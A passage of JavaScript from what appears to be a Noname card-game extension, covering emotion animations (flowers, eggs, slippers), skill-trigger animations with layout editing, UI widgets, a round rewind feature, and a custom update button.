                content: function () {
                    // 队友扔花
                    if (Math.floor(Math.random() * 100) <= 50 && player.isFriendOf(trigger.source)) {
                        player.throwSpineEmotion(trigger.source, 'flower', get.rand(1, 15));
                    }
                    // 敌人扔鸡蛋
                    var dyingSource = trigger.getParent('dying').source;
                    if (Math.floor(Math.random() * 100) <= 80 && dyingSource && player.isEnemyOf(dyingSource)) {
                        player.throwSpineEmotion(dyingSource, 'egg', get.rand(1, 15));
                    }
                },
            },
            // 使用桃
            _qyUseCardEndFlowerOrEgg: {
                trigger: {
                    player: 'useCardEnd'
                },
                filter: function (event, player) {
                    const taoLength = player.getHistory('useCard', function (evt) {
                        return event.card.name == 'tao'
                    })?.length ?? 0;
                    return taoLength !== 0 && taoLength % 3 == 0;
                },
                fixed: true,
                direct: true,
                content: function () {
                    // 如果是友方，自己血量越少扔花几率越大，如果血量比其他队友高，则扔的几率减少
                    var hp = player.hp;
                    player.getFriends().forEach(item => {
                        let initRandom = 15;
                        if (hp <= 2) {
                            initRandom += 10
                        }
                        if (hp <= 1) {
                            initRandom += 30
                        }
                        if (hp < 1) {
                            initRandom += 45
                        }
                        if (hp > item.hp) {
                            initRandom -= 30
                        }
                        // 概率判断
                        if (Math.floor(Math.random() * 100) > initRandom) return;

                        item.throwSpineEmotion(player, 'flower', get.rand(1, 15));
                    });
                    // 如果是敌人，那自己的血量越高敌人扔鸡蛋的几率越大
                    let probability = 20;
                    if (hp > 2) {
                        probability += 20
                    }
                    if (hp > 1) {
                        probability += 10
                    }
                    player.getEnemies().forEach(item => {
                        // 概率判断
                        if (Math.floor(Math.random() * 100) > probability) return;
                        // 扔鸡蛋
                        item.throwSpineEmotion(player, 'egg', get.rand(1, 15));
                    });
                },
            },
            // 使用杀
            _qyUseCardToTrageted: {
                trigger: {
                    player: 'useCardTotargeted',
                },
                filter: function (event, player) {
                    if (!event.target) return false;
                    const shaLength = player.getHistory('useCard', function (evt) {
                        return event.card.name == 'sha'
                    })?.length ?? 0;
                    if (shaLength === 0) return false;
                    if (shaLength % 3 !== 0) return false;
                    return player.isEnemyOf(event.target) && Math.floor(Math.random() * 100) <= 90;
                },
                fixed: true,
                direct: true,
                content: function () {
                    trigger.target.throwSpineEmotion(player, 'egg', get.rand(1, 15));
                },
            },
            // 乐不、兵粮
            _qyBingLiagLeBuTragetedEgg: {
                trigger: {
                    target: ['lebuBegin', 'bingliangBegin'],
                },
                filter: function (event, player) {
                    if (event.player === player) return false;
                    return Math.floor(Math.random() * 100) <= 90;
                },
                fixed: true,
                direct: true,
                content: function () {
                    player.throwSpineEmotion(trigger.player, 'egg', get.rand(1, 15));
                },
            },
            // 阵亡
            _qyDieSourceEgg: {
                trigger: {
                    player: 'die',
                },
                filter: function (event, player) {
                    if (!event.source) return false;
                    if (event.source === player) return false;
                    return true;
                },
                forceDie: true,
                fixed: true,
                direct: true,
                content: function () {
                    const rand = get.rand(10, 15);
                    player.throwSpineEmotion(trigger.source, 'egg', rand);
                    // 自己die后，只有一个队友了，开始摆烂
                    const friends = player.getFriends();
                    if (friends.length !== 1) {
                        return;
                    }
                    const friend = friends[0];
                    friend.throwSpineEmotion(friend, 'giveUpStatus');
                },
            },
            // 使命技成功
            _qyLogSkillFlower: {
                trigger: {
                    player: 'logSkill'
                },
                filter: function (event, player) {
                    const info = lib.skill[event.skill];
                    // 觉醒技
                    if (info?.juexingji) {
                        return true;
                    }
                    // 使命技
                    const sourceSkill = lib.skill[event.sourceSkill];
                    return info?.shimingji === true || sourceSkill?.shimingji === true;
                },
                fixed: true,
                direct: true,
                content: function () {
                    player.getFriends().forEach(item => {
                        if (Math.floor(Math.random() * 100) > 80) return;
                        item.throwSpineEmotion(player, 'flower', get.rand(10, 15));
                    });
                },
            },
        };
        Object.assign(lib.skill, skills);
        for (const skill in skills) {
            game.qyAddGlobalSkill(skill);
        }
    }

    // 交互
    lib.skill['_qy-mvp-flower-egg-shoe'] = {
        trigger: {
            global: 'gameStart',
        },
        direct: true,
        forced: true,
        priority: window.Infinity,
        lastDo: true,
        silent: true,
        popup: false,
        filter: function (a, b) {
            return b === game.me && game.getExtensionConfig('假装无敌', 'qingyao_mvp_flower_egg_shoe');
        },
        content: function () {
            let _swipeorigin = {
                clientX: 0,
                clientY: 0,
                time: get.utc(),
            };
            let types = isMobile ? ['touchstart', "touchmove", 'touchend'] : ['mousedown', 'mousemove', 'mouseup'],
                createButtonContaner = false;
            document.addEventListener(types[2], () => {
                document.querySelectorAll('.qyopennumber').forEach(current => current.remove());
            });
            const createButton = function (player) {
                let container = ui.create.div('.popup-container', {
                    backgroundColor: 'rgba(0,0,0,0.4)',
                    'z-index': 999,
                    'display': 'flex',
                    'justify-content': 'center',
                    'align-content': 'center',
                    'justify-items': 'center',
                    'align-items': 'center',
                    'flex-wrap': 'wrap',
                }, player);
                container.addEventListener('touchstart', function (e) {
                    // 这都是什么阴间判断啊！！！
                    _status.click = true;
                    _status.longpressed = true;
                    _status.clickedplayer = true;
                    _status.dragged = true;
                }, true);

                const addHandler = function (element) {
                    let interval = null;
                    let startTime = void 0;
                    let num = 0;
                    let showNumber = null;
                    let endEval = false;

                    const handler = function handler() {
                        container.delete();
                        game.me.throwSpineEmotion(player, element.link, num);
                    };
                    const clear = function clear() {
                        if (Date.now() - startTime < 200) num = 1
                        handler();
                        clearInterval(interval);
                        document.removeEventListener(types[2], end);
                        player.createButtonContaner = false;
                        interval = null;
                        showNumber.delete();
                        setTimeout(() => {
                            _status.click = false;
                            _status.longpressed = false;
                            _status.clickedplayer = false
                            _status.dragged = false;
                        }, 500);
                    };
                    const end = function (e) {
                        if (endEval) return false;
                        endEval = true;
                        e.stopPropagation();
                        clear();
                    };
                    element.addEventListener(types[0], function () {
                        _status.click = true;
                        _status.clickedplayer = true;
                        _status.dragged = true;
                        clearInterval(interval);
                        startTime = Date.now();
                        showNumber = ui.create.div('.popup-container.qyopennumber', document.body, 'X\t1', {
                            'display': 'flex',
                            'justify-content': 'center',
                            'align-items': 'center',
                            'font-size': '83px',
                            'font-family': 'huangcao',
                            'color': 'yellow',
                            'text-shadow': 'black 0 0 1px, black 0 0 2px, black 0 0 5px, black 0 0 10px, black 0 0 10px',
                            'pointer-events': 'none',
                        });
                        interval = setInterval(() => {
                            showNumber.innerHTML = ('X\t' + (++num))
                        }, 200);
                        document.addEventListener(types[2], end);
                    }, true);
                    element.addEventListener(types[2], end, true);

                }

                let links = {'flower': '鲜花', 'egg': '鸡蛋', 'shoe': '拖鞋', 'wine': '酒杯'};
                for (let link in links) {
                    let div = ui.create.div('.tdnode.pointerdiv.shadowed.reduce_radius.reduce_margin', links[link], container);
                    div.link = link;
                    addHandler(div);
                }

                player.createButtonContaner = true;
            }
            var start = function (e) {
                e.stopPropagation();
                if (this.createButtonContaner) return false;
                this.start = true;
                // 如果是手机的话，那么获取第一个手指按上去的事件
                if (e.touches && e.touches[0]) e = e.touches[0];
                _swipeorigin = {
                    clientX: e.clientX,
                    clientY: e.clientY,
                    time: get.utc(),
                    event: e,
                }
                document.addEventListener(types[2], end.bind(this), true);
            }, move = function (e) {
                e.stopPropagation();
                if (e.touches && e.touches[0]) e = e.touches[0];
                _swipeorigin.event = e;
            }, end = function (e) {
                // e.stopPropagation();
                if (!this.start) return this.start = false;
                this.start = false;
                document.removeEventListener(types[2], end.bind(this), true);
                let dx = _swipeorigin.event.clientX / game.documentZoom - _swipeorigin.clientX / game.documentZoom;
                let dy = _swipeorigin.event.clientY / game.documentZoom - _swipeorigin.clientY / game.documentZoom;
                if (get.utc() - _swipeorigin.time < 1000) {
                    if (Math.abs(dx) < 100 && (dy < -100 || dy > 100)) {
                        createButton(this);
                    }
                }
            };
            game.players.forEach(current => {
                current.addEventListener(types[0], start);
                current.addEventListener(types[1], move);
                current.addEventListener(types[2], end);
            });
        },
    }

    "use strict";
    lib.qyArenaReadyPushOrRunStart(item => {
        lib.cheat.i();
        if (config.frameButton) {
            ui.QyFrameButton.show();
            // ui.QyHomeElementButton.show();
        }
        if (config.qingyao_shoupaikeshi) {
            ui.QYTeammateHand.show();
        }

        const limitSkillAnimation = function (player, type, font, isDragZoom) {
            game.pause2();
            let options = {
                qy_juexingji: {
                    skeScale: 0.9,
                    skeX: 395,
                    skeY: 287,
                },
                qy_xiandingji: {
                    skeScale: 0.9,
                    skeX: 395,
                    skeY: 287,
                },
                qy_shimingji: {
                    skeX: 410,
                    skeY: 280,
                },
            }
            let container,isComplete = false, spine2D = globalThis.qyAnimationUtil.generatorUUID(),
                spine2DBackground = globalThis.qyAnimationUtil.generatorUUID(), radioGroup = null,
                config = options[type],
                close = (event, forecd) => {
                    if (isDragZoom && !forecd) {
                        return;
                    }
                    if (isComplete) {
                        return;
                    }
                    ui.arena.appendChild(lib.qyPlayerAppContainer);
                    container.delete();
                    isComplete = true;
                    JzwdWebWorkerDestroySpine(spine2D, spine2DBackground);
                    type = null;
                    game.resume2();
                    if (radioGroup) {
                        radioGroup.remove();
                    }
                }

            window.setTimeout(() => {
                container = ui.create.div(document.body, '.popup-container', {zIndex: 110}, close);
                var getUiZoom = (function () {
                    var zoom = lib.config.ui_zoom;
                    switch (zoom) {
                        case 'esmall':
                            zoom = 0.8;
                            break;
                        case 'vsmall':
                            zoom = 0.9;
                            break;
                        case 'small':
                            zoom = 0.93;
                            break;
                        case 'big':
                            zoom = 1.05;
                            break;
                        case 'vbig':
                            zoom = 1.1;
                            break;
                        case 'ebig':
                            zoom = 1.2;
                            break;
                        default:
                            zoom = 1;
                    }
                    return zoom;
                }());
                if (getUiZoom) container.style.zoom = 2 - getUiZoom;
                const limitAvatar = ui.create.div(container, '.qy-limit-avatar');
                const avatarBackgroundImage = player && player.name ? player.node.avatar.style.backgroundImage : `url(${lib.assetURL}extension/清瑶葭绮/members/假装无敌/qy_qyqingyaoxuying.jpg)`
                limitAvatar.style.backgroundImage = avatarBackgroundImage;
                if (getUiZoom === 0.8 && isMobile) limitAvatar.css({
                    left: '390px',
                    top: '125px',
                    height: '275px'
                });
                let scale = document.documentElement.clientHeight / limitAvatar.clientHeight;
                if (lib.qyUtils.isMobile) {
                    scale += Math.max(game.documentZoom || 1, 1);
                }
                limitAvatar.style.setProperty('--scale', scale, 'important');
                if (player === 'qy_qyqingyaoxuying') {
                    limitAvatar.setBackgroundImage('extension/清瑶葭绮/members/假装无敌/qy_qyqingyaoxuying.jpg')
                }
                if (game.getExtensionConfig('假装无敌', 'qingyao_outcrop')) {
                    limitAvatar.css({
                        height: isMobile ? '290px' : '46%',
                        top: isMobile ? '100px' : '25%;',
                    });
                    if (getUiZoom === 0.8 && isMobile) limitAvatar.css({
                        width: '176px',
                        left: '388px',
                        top: '105px',
                        height: '296px'
                    })
                }
                // 字体容器
                const fontDivContainer = ui.create.div(container, '.qy-juexingji-xiandingji-font-container.qy_hidden');
                fontDivContainer.style.setProperty('--font-size', '40px');
                if (font?.length) {
                    for (let i = 0; i < font.length; i++) {
                        ui.create.div(fontDivContainer, `.qy-juexingji-xiandingji-font.${type}`, font[i]);
                    }
                }


                setTimeout(() => {
                    resetFontDivContainerFontSize(parseInt(fontDivContainer.style.width, 0));
                    fontDivContainer.classList.remove('qy_hidden');
                    container.appendChild(lib.qyPlayerAppContainer);
                    // 背景图
                    JzwdWebWorkerOrMainWorker(lib.qyPlayerAppContainer, type, Object.assign(config, lib.qyUtils.getConfig(type, {}), {
                        x: 0,
                        y: 0,
                        scale: 1,
                    }), spine2DBackground);
                    // 主要图
                    lib.qyWorkerSpineOnce(Object.assign({name: 'qy_effect_' + type.replace('qy_', ''), uuid: spine2D},
                        lib.qyUtils.getConfig('qy_effect_' + type.replace('qy_', ''), {}), {
                            x: 0,
                            y: 0,
                            scale: 1,
                        }), null, function (data, error) {
                        close();
                    });
                }, 780);

                const dragZome = ['.qy-limit-avatar', '.qy-juexingji-xiandingji-font-container'];
                dragZome.map(item => [document.querySelector(item)].concat(game.getExtensionConfig('假装无敌', `${item}_${type}`) || [null, null]))
                    .filter(arrayElement => arrayElement[0] != null)
                    .forEach(arrayElement => {
                        let element = arrayElement[0];
                        if (arrayElement[1] != null) element.style.left = arrayElement[1]
                        if (arrayElement[2] != null) element.style.top = arrayElement[2]
                    });
                dragZome.map(item => [document.querySelector(item)].concat(game.getExtensionConfig('假装无敌', `${item}_${type}_zoom`) || [null, null]))
                    .filter(arrayElement => arrayElement[0] != null)
                    .forEach(arrayElement => {
                        let element = arrayElement[0];
                        if (arrayElement[1] != null) element.style.width = arrayElement[1]
                        if (arrayElement[2] != null) element.style.height = arrayElement[2]
                    });
                const resetFontDivContainerFontSize = (clientWidth = fontDivContainer.clientWidth) => fontDivContainer.style.setProperty('--font-size', Math.floor(100 * (clientWidth / 300)) + 'px');

                if (isDragZoom) {
                    dragZome.forEach(clazz => {
                        let element = document.querySelector(clazz);
                        // 没有找到这个元素，跳过循环
                        if (element === null) return;
                        // 给元素加上边框,取消动画过渡
                        element.style.border = '2px dashed #fff';
                        element.style.transition = "none";
                        new window.qingyaoZoom(element);
                        window.zyile_dragZoom(element, container, true, true);
                        const listener = event => {
                            lib.config[`${clazz}_${type}`] = [element.style.left, element.style.top];
                            game.saveExtensionConfig('假装无敌', `${clazz}_${type}`, lib.config[`${clazz}_${type}`]);
                            lib.config[`${clazz}_${type}_zoom`] = [element.style.width, element.style.height];
                            game.saveExtensionConfig('假装无敌', `${clazz}_${type}_zoom`, lib.config[`${clazz}_${type}_zoom`]);
                            resetFontDivContainerFontSize();
                        }
                        element.addEventListener('zoomStop', listener)
                        element.addEventListener('moveStop', listener);
                        element.addEventListener('zoomMove', () => resetFontDivContainerFontSize());
                    })

                    radioGroup = ui.create.div(document.body, {
                        position: 'fixed',
                        bottom: '150px',
                        left: '40px',
                        zIndex: 110,
                        width: '90px',
                    });

                    setTimeout(() => {
                        if (isComplete) return;
                        lib.qyWorkerStopSpine(spine2D);
                        lib.qyWorkerStopSpine(spine2DBackground);
                    }, 2000)

                    lib.createQyRadio(radioGroup, [{
                        label: '骨骼 - 武将边框',
                        checked: false
                    }, {
                        label: '骨骼 - 背景图片',
                        checked: false
                    }, {
                        label: '素材 - 武将图片和字体',
                        checked: true
                    }], function (label) {
                        if (label === '骨骼 - 武将边框') {
                            DragZoomHelperUtils.start({spineId: spine2D, parent: container}, val => {
                                let msg = "点击进行拖拽，鼠标滚轮进行缩放";
                                if (lib.qyUtils.isMobile) {
                                    msg = "单指移动，双指缩放。";
                                }
                                lib.qyMessage.queueMessageInfo(msg);
                            });
                            DragZoomHelperUtils.close(spine2DBackground);
                        } else if (label === '骨骼 - 背景图片') {
                            DragZoomHelperUtils.start({spineId: spine2DBackground, parent: container}, val => {
                                let msg = "点击进行拖拽，鼠标滚轮进行缩放";
                                if (lib.qyUtils.isMobile) {
                                    msg = "单指移动，双指缩放。";
                                }
                                lib.qyMessage.queueMessageInfo(msg);
                            });
                            DragZoomHelperUtils.close(spine2D);
                        } else if (label === '素材 - 武将图片和字体') {
                            DragZoomHelperUtils.close(spine2D);
                            DragZoomHelperUtils.close(spine2DBackground);
                        }
                    });

                    let settingOver = ui.create.div('.qy-button.qy-button--primary', '设置完毕', radioGroup, {
                        position: 'fixed',
                        bottom: '88px',
                        left: '38px',
                        zIndex: 9999,
                    });
                    settingOver.addEventListener('click', event => {
                        Promise.allSettled([new Promise(resolve => {
                            lib.qyWorkerGetInfoBySpineId({uuid: spine2DBackground}, (data,error) => {
                                if (error) {
                                    return lib.qyMessage.queueMessageError(error);
                                }
                                if (Object.keys(data).length === 0) {
                                    return lib.qyMessage.queueMessageError(`根据spineId：${mvpSpineAnimation}，未找到正在播放的<font color="red">${type}</font>特效！`);
                                }
                                game.saveExtensionConfig('假装无敌', type, {
                                    skeX: data.x,
                                    skeY: data.y,
                                    skeScale: data.scale.x,
                                });
                                resolve(true);
                            });
                        }),new Promise(resolve => {
                            lib.qyWorkerGetInfoBySpineId({uuid: spine2D}, (data,error) => {
                                if (error) {
                                    return lib.qyMessage.queueMessageError(error);
                                }
                                if (Object.keys(data).length === 0) {
                                    return lib.qyMessage.queueMessageError(`根据spineId：${mvpSpineAnimation}，未找到正在播放的<font color="red">${'qy_effect_' + type.replace('qy_', '')}</font>特效！`);
                                }
                                game.saveExtensionConfig('假装无敌', 'qy_effect_' + type.replace('qy_', ''), {
                                    skeX: data.x,
                                    skeY: data.y,
                                    skeScale: data.scale.x,
                                });
                                resolve(true);
                            });
                        })]).then(res => {
                            close(null, true);
                            lib.qyMessage.queueMessageSuccess("保存成功！");
                        });
                    });
                    let InitializeSettings = ui.create.div('.qy-button', '初始化设置', radioGroup, {
                        position: 'fixed',
                        bottom: '28px',
                        left: '38px',
                    });
                    InitializeSettings.addEventListener('click', event => {
                        radioGroup.remove();
                        game.saveExtensionConfig('假装无敌', type)
                        game.saveExtensionConfig('type', 'qy_effect_' + type.replace('qy_', ''))
                        dragZome.forEach(clazz => {
                            game.saveExtensionConfig('假装无敌', `${clazz}_${type}`);
                            game.saveExtensionConfig('假装无敌', `${clazz}_${type}_zoom`);
                        })
                        close(null, true)
                    });

                }

            }, 150);
        }
        lib.limitSkillAnimation = limitSkillAnimation;

        if (lib.config.extension_假装无敌_qingyao_shousha_limit) {
            setTimeout(() => {
                Object.keys(lib.skill).filter(value => {
                    const skill = lib.skill[value]
                    if (!skill || !lib.translate[value]
                        || !lib.translate[value + '_info']) return false;
                    return !!(skill.limited || skill.juexingji || skill.dutySkill);
                }).forEach(item => {
                    var lockSkillAnimation = function (value) {
                        lib.skill[value].skillAnimation = false;
                        Object.defineProperty(lib.animate.skill, value, {
                            get: function () {
                                return function () {
                                    var type = "qy_shimingji";
                                    if (lib.skill[value].hasOwnProperty("limited")) {
                                        type = "qy_xiandingji";
                                    } else if (lib.skill[value].hasOwnProperty("juexingji")) {
                                        type = "qy_juexingji";
                                    }
                                    limitSkillAnimation(this, type, lib.translate[value])
                                }
                            },
                            set: function () {
                            },
                            enumerable: true,
                            configurable: false,
                        });
                    }
                    if (lib.skill[item].dutySkill) {
                        if (lib.skill[item].group) {
                            [item].concat(lib.skill[item].group)
                                .filter(value => lib.skill[value] !== void 0)
                                .filter(value => lib.skill[value].skillAnimation === true)
                                .forEach(value => {
                                    lib.skill[value].shimingji = true;
                                    lockSkillAnimation(value)
                                })
                        }
                    } else {
                        lockSkillAnimation(item)
                    }
                })
            }, 1500)
        }

        setTimeout(function uiCommandnode() {
            if (!ui.commandnode) return setTimeout(uiCommandnode, 1e3)
            try {
                let linkElement = ui.commandnode.parentElement.firstElementChild.link
                let gameUpdateButton = Array.from(linkElement.querySelectorAll('button')).filter(item => item.textContent.indexOf('更新') !== -1 && !['渡劫更新', '渡劫更新素材'].contains(item.textContent))[0]
                let button = ui.create.div('.qy-button', '渡劫更新')
                gameUpdateButton.parentElement.replaceChild(button, gameUpdateButton);
                let rebutton = ui.create.div('.qy-button', '渡劫更新素材')
                let buttonResources = Array.from(linkElement.querySelectorAll('button')).filter(item => item.textContent.indexOf('更新') !== -1 && !['渡劫更新', '渡劫更新素材'].contains(item.textContent))[0]
                buttonResources.parentElement.replaceChild(rebutton, buttonResources)
                button.link = 'checkUpdateForBody'
                rebutton.link = 'checkUpdateForResources'
                rebutton.onclick = button.onclick = function (event) {
                    event.stopPropagation()
                    window.qyCachesMainWindow.show()
                    // 渡劫更新
                    window.qyCachesMainWindow.postMessage({
                        type: 'router',
                        data: {
                            path: '/noname/downloadFile'
                        }
                    })
                    setTimeout(() => {
                        window.qyCachesMainWindow.postMessage({
                            type: 'methods',
                            data: this.link
                        })
                    }, 800)
                }
            } catch (e) {
            }
        }, 1000)
    });
    // 有+-的数字框
    lib.qyResizeOpen = function (option) {

        function add(num1, num2) {
            var precision = Math.max(getPrecision(this), getPrecision(num2));
            var multiplier = Math.pow(10, precision);
            var result = (num1 * multiplier + num2 * multiplier) / multiplier;
            return parseFloat(result.toFixed(precision));
        };

        function sub(num1, num2) {
            var precision = Math.max(getPrecision(this), getPrecision(num2));
            var multiplier = Math.pow(10, precision);
            var result = (num1 * multiplier - num2 * multiplier) / multiplier;
            return parseFloat(result.toFixed(precision));
        };

        function getPrecision(num) {
            var decimalPart = String(num).split('.')[1];
            return decimalPart ? decimalPart.length : 0;
        }

        // 初始化
        const options = {
            value: 0,
            min: -Infinity,
            max: Infinity,
            speed: 1,
            events: {
                keydown: [function (event) {
                    event.stopPropagation();
                }],
                input: [function (event) {
                    if (this.value > options.max) {
                        this.value = options.max;
                    }
                    if (this.value < options.min) {
                        this.value = options.min;
                    }

                    if (this.value >= options.max) {
                        this.right.classList.add('is-disabled');
                    } else {
                        this.right.classList.remove('is-disabled');
                    }

                    if (this.value <= options.min) {
                        this.left.classList.add('is-disabled');
                    } else {
                        this.left.classList.remove('is-disabled');
                    }
                }],
            },
            visButton: true,
            isDrag: true,
            style: {
                padding: '20px',
                top: '50%',
                left: '50%',
                transform: 'translate(-50%, -50%)',
                transition: 'none',
            },
            callback: function (value) {

            },
        };
        if (typeof option === 'object' && option != null) {
            if (option.events) {
                for (let i in option.events) {
                    if (options.events[i]) options.events[i] = options.events[i].concat(option.events[i]);
                    else options.events[i] = [].concat(option.events[i]);
                }
            }
            delete option.events;
            if (option.max && isNaN(Number(option.max))) delete option.max;
            if (option.min && isNaN(Number(option.min))) delete option.min;
            Object.assign(options, option);
        }
        let container = ui.create.div(document.body, options.style, '.qy-input-number-container');
        ui.create.div('', {
            cssText: `left: 50%;
                        position: relative;
                        line-height: 20px;
                        color: #409eff;
                        transform: translateX(-50%);
                        `
        }, options.label, container);
        let qyInputNumber = ui.create.div(container, '.qy-input-number');
        qyInputNumber.ondragstart = event => event.preventDefault();
        let qySpanLeft = ui.create.node('span.qy-input-number__decrease', '-', qyInputNumber);
        let qySpanRight = ui.create.node('span.qy-input-number__increase', '+', qyInputNumber);
        qySpanLeft.addEventListener('click', function (event) {
            event.stopPropagation();
            if (this.classList.contains('is-disabled')) return;
            input.value = sub(input.value, options.speed);
            options.events.input.forEach(val => val.call(input));
        });
        qySpanRight.addEventListener('click', function (event) {
            event.stopPropagation();
            if (this.classList.contains('is-disabled')) return;
            input.value = add(input.value, options.speed);
            options.events.input.forEach(val => val.call(input));
        });
        let qyInput = ui.create.div('.qy-input', qyInputNumber);
        let input = container.node = ui.create.node('input', qyInput);
        input.type = 'number';
        input.max = options.max;
        input.min = options.min;
        input.value = options.value;
        input.left = qySpanLeft;
        input.right = qySpanRight;
        // 绑定事件
        for (let i in options.events) {
            if (typeof options.events[i] == 'function') input.addEventListener(i, options.events[i].bind(input), true);
            else options.events[i].forEach(val => input.addEventListener(i, val.bind(input), true));
        }
        if (options.visButton) {
            ui.create.div(container, '.qy-button.qy-button--primary', {
                position: 'relative',
                margin: '8px'
            }, '<span>确认</span>').addEventListener('click', event => {
                container.remove();
                setTimeout(() => options.callback(input.value), 300);
            })
            ui.create.div(container, '.qy-button', {
                position: 'relative',
                margin: '8px'
            }, '<span>取消</span>').addEventListener('click', event => {
                container.remove();
            });
        }
        container.style.zIndex = 999;
        if (options.isDrag) {
            setTimeout(() => {
                [].forEach.call(container.querySelectorAll("*"), val => val.finished = true);
                window.zyile_dragZoom(container, document.body, true, true, true);
            }, 300);
        }
        return container;
    };
    // 设置动态MVP左边武将显示字体大小
    if (game.getExtensionConfig('假装无敌', 'resizeLeftFontSize') !== void 0) {
        window.resizeLeftFontSize = parent.document.createElement('style');
        window.document.head.appendChild(parent.resizeLeftFontSize);
        window.resizeLeftFontSize.innerHTML = `
        .qy-avatar-border-1::before,.qy-avatar-border::before {
                    font-size: ${game.getExtensionConfig('假装无敌', 'resizeLeftFontSize')}vw !important;
                }`;
    }
    // 设置mvp玩家姓名字体大小
    if (game.getExtensionConfig('假装无敌', 'resizePlayerNameFont') !== void 0) {
        window.resizePlayerNameFont = parent.document.createElement('style');
        window.document.head.appendChild(parent.resizePlayerNameFont);
        window.resizePlayerNameFont.innerHTML = `
              .qy-mvp-player-info .qy-mvp-player-nickname{
                      font-size: ${game.getExtensionConfig('假装无敌', 'resizePlayerNameFont')}vw !important;
                }`;
    }
    // 设置动态MVP右边字体大小(vm)
    if (game.getExtensionConfig('假装无敌', 'resizeRightFont') !== void 0) {
        window.resizeRightFont = document.createElement('style');
        document.head.appendChild(window.resizeRightFont);
        window.resizeRightFont.innerHTML = `
            .qy-mvp-player-info * {
                  font-size: ${game.getExtensionConfig('假装无敌', 'resizeRightFont')}vw;
            }`;
    }
    // 设置动态MVP分数字体大小(vm)
    if (game.getExtensionConfig('假装无敌', 'resizeDynamicRightFont') !== void 0) {
        window.resizeDynamicRightFont = document.createElement('style');
        document.head.appendChild(window.resizeDynamicRightFont);
        window.resizeDynamicRightFont.innerHTML = `
            .qy-mvp-technology *{
                font-size: ${game.getExtensionConfig('假装无敌', 'resizeDynamicRightFont')}vw;
            }`;
    }
    // 复原
    if (config.qingyao_cundang && config.qingyao_cundang !== 'false') {
        lib.skill._ymlunhun = {
            trigger: {
                global: 'roundStart'
            },
            slient: true,
            popup: false,
            firstDo: true,
            forced: true,
            direct: true,
            init: function (player) {
                window.qingyao_history = [];
            },
            filter: function (event, player) {
                return player === game.me;
            },
            content: function () {
                // 手牌，装备牌，判定牌，遍历场上所有人的属性，
                if (!window.qingyao_history) window.qingyao_history = [];

                let history = [];

                // 记录_status的数组
                history.statusKeys = {}
                Object.keys(_status)
                    .filter(item => Array.isArray(_status[item]))
                    .forEach(key => {
                        history.statusKeys[key] = lib.qyDeepClone(_status[key]);
                    });
                // 遍历全场人的属性
                const players = game.players.concat(game.dead);
                for (let i of players) {
                    let deepClone = lib.qyDeepClone(i, window.undefined, true);
                    deepClone.h = i.getCards('h');
                    deepClone.s = i.getCards('s');
                    deepClone.e = i.getCards('e');/*get.cardsInfo(i.get('e').map(item=>{return {name: item[2],number: item[1],suit: item[0],nature: item[3],}}));*/
                    deepClone.j = i.getCards('j');
                    deepClone.x = i.getCards('x');
                    deepClone.gaintag = {};
                    for (var j = 0; j < i.getCards('x').length; j++) {
                        deepClone.gaintag[j] = i.getCards('x')[j].gaintag;
                    }
                    // 记录卡牌storage
                    deepClone.equipCardStorage = {};
                    // 记录卡牌的值为Array属性
                    deepClone.equipCardArray = {};
                    for (let equipCard of deepClone.e) {
                        // 记录下卡牌的storage
                        deepClone.equipCardStorage[equipCard.name] = lib.qyDeepClone(equipCard.storage);
                        deepClone.equipCardArray[equipCard.name] = {};
                        Object.keys(equipCard)
                            .filter(item => Array.isArray(equipCard[item]))
                            .forEach(item => {
                                deepClone.equipCardArray[equipCard.name][item] = equipCard[item].slice(0);
                            })
                    }
                    /**
                     for(var j=0;j<i.getCards('e').length;j++){
                     for(var k in i.getCards('e')[j]){
                     if(Array.isArray(i.getCards('e')[j][k])){
                     if(!deepClone[i.getCards('e')[j].name]) deepClone[i.getCards('e')[j].name]={};
                     deepClone[i.getCards('e')[j].name][k]=i.getCards('e')[j][k];
                     }
                     }
                     }
                     */
                    deepClone.keys = Object.keys(i);
                    deepClone.qyState = i.getState();
                    history.push(deepClone);
                }
                setTimeout(function () {
                    history.arena = ui.arena.cloneNode(true);
                    history.arena.querySelectorAll('audio').forEach(item => item.remove());
                    history.arena.css({
                        zoom: 0.6,
                        position: 'relative',
                        width: '85%',
                        height: '500px',
                        left: 0,
                        backgroundSize: '100% 100%',
                        backgroundImage: `url(${lib.assetURL}extension/清瑶葭绮/members/假装无敌/images/back.jpeg)`,
                    })
                }, 200);

                history.hookmap = lib.qyDeepClone(lib.hookmap);
                history.hook = lib.qyDeepClone(lib.hook);
                // 牌堆的牌
                history.cardPile = Array.from(ui.cardPile.childNodes).slice(0);
                // 弃牌堆的牌
                history.discardPile = Array.from(ui.discardPile.childNodes).slice(0);
                // 当前的轮数
                history.roundNumber = game.roundNumber;
                history.phaseNumber = game.phaseNumber;
                // 当前轮数的角色是谁，到时候好恢复
                history.roundStart = _status.roundStart;
                // 存储游戏的State
                if (game.getState) history.qyGetState = lib.qyDeepClone(game.getState());
                window.qingyao_history.push(history);
            },
        };
        lib.skill._ymfuyuan = {
            enable: "phaseUse",
            filter: function (event, player) {
                return window.qingyao_history && window.qingyao_history.length > 0 && game.me === player;
            },
            popup: false,
            log: false,
            content: function () {
                'step 0'
                const dialog = ui.create.dialog('forcebutton');
                dialog.addText('请选择要复原的轮数');
                event.dialog = dialog;
                dialog.css({
                    all: 'inherit',
                });

                /*let css = {
                    height: '70%',
                    width: 'calc(100% - 95px)',
                    left: '50%',
                    top: isMobile ? '40%' : '30%',
                    transition: 'none',
                    transform: 'translate(-50%,-50%)',
                    animation: 'none',
                    'z-index': 9,
                }
                for(var i in css)
                    dialog.style.setProperty(i,css[i],'important');*/

                dialog.classList.add('noupdate', 'fixed', 'qy_card_selected', 'qy_round_fuyuan');
                dialog.addEventListener(lib.config.touchscreen ? 'touchend' : 'mouseup', function () {
                    _status.clicked2 = true;
                });

                event.selected = null;
                let _event = event;
                event.reuslt = {
                    bool: false,
                };
                event.ok = ui.create.control('确定', function () {
                    _event.reuslt = {
                        bool: true,
                        links: _event.selected.link
                    }
                    dialog.close();
                    game.resume();
                }).hide().css({zIndex: 500});
                event.ok.parentElement.css({
                    zIndex: 500,
                })
                event.cancel = ui.create.control('取消复原', game.resume).css({zIndex: 500});
                let list = window.qingyao_history;
                let div = ui.create.div({
                    display: 'block',
                    zIndex: '9999',
                    width: '100%',
                    height: '100%',
                }, '', '点击轮数显示预览图');

                for (var i = 0; i < list.length; i++) {
                    let arena = list[i].arena;
                    let node = ui.create.div('.tdnode.pointerdiv.shadowed.reduce_radius.reduce_margin', `第${i + 1}轮`);
                    if (get.is.phoneLayout()) {
                        node.style.fontSize = '30px';
                    }
